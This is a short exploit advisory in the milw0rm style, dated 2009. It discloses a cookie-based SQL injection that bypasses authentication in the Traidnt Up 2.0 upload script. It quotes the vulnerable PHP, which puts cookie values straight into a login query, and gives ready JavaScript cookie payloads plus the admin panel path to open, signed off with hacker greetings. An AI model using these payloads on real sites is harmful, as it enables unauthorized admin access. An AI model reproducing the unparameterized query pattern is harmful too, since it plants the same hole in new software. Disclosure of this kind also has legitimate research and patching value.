@@ -1,0 +1,49 @@
+                  ||          ||   | ||
+           o_,_7 _||  . _o_7 _|| q_|_||  o_w_,
+          ( :   /    (_)    /           (   .  
+
+
+=By: 	Qabandi
+=Email:	iqa[a]hotmail.fr
+
+	From Kuwait PEACE
+                      
+=Vuln:		Traidnt Up version 2.0 (Auth Bypass / Cookie) SQL Injection Vulnerability
+=INFO:		http://traidnt.net/vb/showthread.php?t=943260
+=BUY:  		----
+=DORK:		----
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-SQL-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+-----------------Vulnerable-code:--adminquery.php------------------
+if(isset($_COOKIE[trupuser])){
+
+      $adminuser =  strip_tags($_COOKIE[trupuser]);<---not filtered properly
+      $adminpassword = strip_tags($_COOKIE[truppassword]);
+
+ 	  $getadmin = $db->query("SELECT * FROM `admin` WHERE `admin`.`admin_user` = '$adminuser' AND `admin`.`admin_password` = '$adminpassword'  LIMIT 0 , 1 ");
+   	  $issetadmin = $db->resultcount($getadmin);
+
+   	  if($issetadmin == 1){ <---- Checks if SQL statement is true then give the OK.
+-------------------------------------------------------------------
+=-=--=-==-=-=-=-=-=-=PoC=-=-=-=----=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==
+Condition!: Magic_quotes_gpc == OFF!
+
+APPLY THESE COOKIES:
+Javascript:document.cookie = "trupuser=admin' or '1'='1;"
+Javascript:document.cookie = "truppassword=Qabandi' or '1'='1;"
+
+Go To:
+./uploadcp/index.php
+
+Enjoy Q_Q
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+-=-=-=-==-=-=-==-COOOOKIEEEE!!!<3<3<3<3<3=---=-=-=-=-=--=-=-=-=-=-
+-=-=-=-=-=-=-=Qabandi=-=-=Was-=-=-=--=-===-=HERE-=-=-=-=--=-=-=-==
+=-=-=-=-==-=-=-=-=-=-No----More---Private=-=-=-=-=-=-=-=-=-=-=-=-=
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Salamz: Killer Hack, Mr.Mn7os, All muslim hackers.
+
+# milw0rm.com [2009-05-29]
